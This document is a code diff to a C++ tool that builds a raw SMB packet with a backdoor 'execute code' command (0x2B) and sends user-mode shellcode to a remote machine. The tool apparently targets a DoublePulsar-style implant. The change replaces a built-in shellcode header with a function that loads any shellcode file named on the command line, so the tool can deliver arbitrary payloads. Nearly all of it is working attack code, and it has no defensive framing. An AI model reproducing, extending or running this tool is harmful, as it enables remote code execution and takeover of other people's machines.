@@ -8,8 +8,20 @@
 
 
 #include "packet.h"
-#include "shellcode.h"
+#include <vector>
+#include <string>
+#include <fstream>
 
+
+std::vector<char> byte_read(char const* filename)
+{
+	std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
+	std::ifstream::pos_type pos = ifs.tellg();
+	std::vector<char>  result(pos);
+	ifs.seekg(0, std::ios::beg);
+	ifs.read(&result[0], pos);
+	return result;
+}
 
 int main(int argc, char* argv[]) {
 	WORD wVersionRequested = MAKEWORD(2, 2);
@@ -35,13 +47,14 @@ int main(int argc, char* argv[]) {
 	exec.BackdoorCommand = 0x2B;	//0x2b execute code
 
 	exec.NetBiosLength = htons((sizeof(REPULSAR_EXECUTE) - 0x4)); //4Bytes netbios struct
-	
 
-	exec.ShellcodeLength = sizeof(USERMODE_SHELLCODE) - 0x1;
+	std::vector<char> USERMODE_SHELLCODE;
+	USERMODE_SHELLCODE = byte_read(argv[2]);
+	exec.ShellcodeLength = USERMODE_SHELLCODE.size();
 
-	memset(exec.shellcode, 0, sizeof(USERMODE_SHELLCODE)-0x1); //1Byte 0-terminated array
-	memcpy(exec.shellcode, USERMODE_SHELLCODE, sizeof(USERMODE_SHELLCODE)-0x1);
 
+	memset(exec.shellcode, 0, USERMODE_SHELLCODE.size()); //1Byte 0-terminated array
+	memcpy(exec.shellcode, USERMODE_SHELLCODE.data(), USERMODE_SHELLCODE.size());
 
 	printf("SHELLCODE SIZE 0x%x\n", exec.ShellcodeLength);
 	printf("Sending SMB packet wit tag 0x%x and command 0x%X...\n", *(PULONG)exec.SmbHeader, exec.BackdoorCommand);
@@ -49,5 +62,6 @@ int main(int argc, char* argv[]) {
 	send(sock, (const char*)&exec, sizeof(REPULSAR_EXECUTE), 0);
 
 	printf("--------Done!\n");
+	
 	return 0;
 }
